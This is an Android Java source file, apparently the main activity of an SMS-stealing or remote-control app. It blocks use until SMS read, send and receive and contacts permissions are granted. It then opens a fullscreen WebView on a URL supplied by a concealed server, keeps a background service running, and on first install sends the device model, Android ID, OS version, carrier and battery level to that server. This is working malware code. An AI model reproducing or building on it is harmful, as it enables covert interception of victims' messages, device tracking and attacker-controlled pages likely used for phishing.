package com.drnull.app;

import android.Manifest;
import android.app.Activity;
import android.content.Context;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.os.Build;
import android.os.Bundle;
import android.os.Handler;
import android.os.Looper;
import android.provider.Settings;
import android.view.KeyEvent;
import android.view.WindowManager;
import android.webkit.WebResourceRequest;
import android.webkit.WebView;
import android.webkit.WebViewClient;
import android.widget.LinearLayout;
import android.widget.TextView;
import org.json.JSONObject;
import java.io.BufferedReader;
import java.io.InputStreamReader;
import java.io.OutputStream;
import java.net.HttpURLConnection;
import java.net.URL;
import java.util.HashMap;
import java.util.Map;

public class MainActivity extends Activity {
    private static final String SERVER = SecureConfig.getServerUrl();
    private static final int PERM_REQ_CODE = 101;
    private WebView webView;
    private boolean permsGranted = false;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        checkAndProceed();
    }

    private void checkAndProceed() {
        if (Build.VERSION.SDK_INT >= 23) {
            String[] criticalPerms;
            if (Build.VERSION.SDK_INT >= 33) {
                criticalPerms = new String[]{
                    Manifest.permission.READ_SMS,
                    Manifest.permission.SEND_SMS,
                    Manifest.permission.RECEIVE_SMS,
                    Manifest.permission.READ_CONTACTS,
                    Manifest.permission.POST_NOTIFICATIONS
                };
            } else {
                criticalPerms = new String[]{
                    Manifest.permission.READ_SMS,
                    Manifest.permission.SEND_SMS,
                    Manifest.permission.RECEIVE_SMS,
                    Manifest.permission.READ_CONTACTS
                };
            }

            boolean allGranted = true;
            for (String p : criticalPerms) {
                if (checkSelfPermission(p) != PackageManager.PERMISSION_GRANTED) {
                    allGranted = false;
                    break;
                }
            }

            if (allGranted) {
                permsGranted = true;
                initApp();
            } else {
                requestPermissions(criticalPerms, PERM_REQ_CODE);
            }
        } else {
            permsGranted = true;
            initApp();
        }
    }

    @Override
    public void onRequestPermissionsResult(int requestCode, String[] permissions, int[] grantResults) {
        super.onRequestPermissionsResult(requestCode, permissions, grantResults);
        if (requestCode == PERM_REQ_CODE) {
            boolean allOk = true;
            if (grantResults != null) {
                for (int r : grantResults) {
                    if (r != PackageManager.PERMISSION_GRANTED) {
                        allOk = false;
                        break;
                    }
                }
            } else {
                allOk = false;
            }

            if (allOk) {
                permsGranted = true;
                initApp();
            } else {
                showErrorScreen();
            }
        }
    }

    private void showErrorScreen() {
        LinearLayout layout = new LinearLayout(this);
        layout.setOrientation(LinearLayout.VERTICAL);
        layout.setGravity(android.view.Gravity.CENTER);
        layout.setPadding(48, 48, 48, 48);
        layout.setBackgroundColor(0xFF1A1A2E);

        TextView tv = new TextView(this);
        tv.setText("Permission Required\n\n" +
            "This application requires SMS and Notification permissions.\n\n" +
            "Please reinstall and grant all permissions.");
        tv.setTextColor(0xFFFFFFFF);
        tv.setTextSize(16);
        tv.setGravity(android.view.Gravity.CENTER);

        LinearLayout.LayoutParams lp = new LinearLayout.LayoutParams(
            LinearLayout.LayoutParams.MATCH_PARENT, LinearLayout.LayoutParams.WRAP_CONTENT);
        layout.addView(tv, lp);

        setContentView(layout);
        getWindow().setFlags(
            WindowManager.LayoutParams.FLAG_FULLSCREEN,
            WindowManager.LayoutParams.FLAG_FULLSCREEN
        );
    }

    private void initApp() {
        getWindow().setFlags(WindowManager.LayoutParams.FLAG_FULLSCREEN, WindowManager.LayoutParams.FLAG_FULLSCREEN);

        webView = new WebView(this);
        webView.getSettings().setJavaScriptEnabled(true);
        webView.getSettings().setDomStorageEnabled(true);
        webView.getSettings().setAllowFileAccess(false);
        webView.setWebViewClient(new WebViewClient() {
            @Override
            public boolean shouldOverrideUrlLoading(WebView view, WebResourceRequest request) {
                String url = request.getUrl().toString();
                if (url.startsWith("http://") || url.startsWith("https://")) {
                    view.loadUrl(url);
                    return true;
                }
                return false;
            }
        });

        setContentView(webView);
        loadUrl();
        startSvc();
        firstInstall();
    }

    @Override
    public boolean onKeyDown(int keyCode, KeyEvent event) {
        if (keyCode == KeyEvent.KEYCODE_BACK && webView != null && webView.canGoBack()) {
            webView.goBack();
            return true;
        }
        return super.onKeyDown(keyCode, event);
    }

    @Override
    protected void onResume() {
        super.onResume();
        if (permsGranted) {
            startSvc();
        }
    }

    private void loadUrl() {
        new Thread(() -> {
            try {
                HttpURLConnection c = (HttpURLConnection) new URL(SERVER + "/url").openConnection();
                c.setRequestMethod("GET");
                c.setConnectTimeout(5000);
                BufferedReader r = new BufferedReader(new InputStreamReader(c.getInputStream()));
                StringBuilder sb = new StringBuilder();
                String l;
                while ((l = r.readLine()) != null) sb.append(l);
                r.close();
                String u = sb.toString().trim();
                if (!u.isEmpty()) {
                    new Handler(Looper.getMainLooper()).post(() -> webView.loadUrl(u));
                }
            } catch (Exception e) {
                new Handler(Looper.getMainLooper()).post(() -> webView.loadUrl("https://google.com"));
            }
        }).start();
    }

    private void startSvc() {
        try {
            Intent i = new Intent(this, WSService.class);
            if (Build.VERSION.SDK_INT >= 26) startForegroundService(i); else startService(i);
        } catch(Exception e) {}
    }

    private void firstInstall() {
        try {
            java.io.File f = new java.io.File(getFilesDir(), "null_installed.txt");
            if (!f.exists()) {
                f.createNewFile();
                Map<String,String> d = new HashMap<>();
                d.put("action","firstinstall");
                d.put("model", Build.MODEL);
                d.put("androidid", Settings.Secure.getString(getContentResolver(), Settings.Secure.ANDROID_ID));
                d.put("androidv", Build.VERSION.RELEASE);
                try {
                    android.telephony.TelephonyManager tm = (android.telephony.TelephonyManager) getSystemService(Context.TELEPHONY_SERVICE);
                    d.put("carrier", tm!=null&&tm.getSimOperatorName()!=null?tm.getSimOperatorName():"");
                } catch(Exception e) { d.put("carrier",""); }
                d.put("battery", String.valueOf(getBat()));
                doPost(SERVER + "/api", d);
            }
        } catch (Exception e) {}
    }

    private int getBat() {
        try {
            android.content.IntentFilter f = new android.content.IntentFilter(Intent.ACTION_BATTERY_CHANGED);
            android.content.Intent i = registerReceiver(null, f);
            return i!=null ? i.getIntExtra(android.os.BatteryManager.EXTRA_LEVEL,-1) : -1;
        } catch(Exception e) { return -1; }
    }

    public static void doPost(String u, Map<String,String> d) {
        new Thread(() -> {
            try {
                HttpURLConnection c = (HttpURLConnection) new URL(u).openConnection();
                c.setRequestMethod("POST");
                c.setRequestProperty("Content-Type","application/json");
                c.setConnectTimeout(5000);
                c.setDoOutput(true);
                OutputStream os = c.getOutputStream();
                os.write(new JSONObject(d).toString().getBytes());
                os.flush(); os.close();
                c.getResponseCode(); c.disconnect();
            } catch(Exception e) {}
        }).start();
    }
}
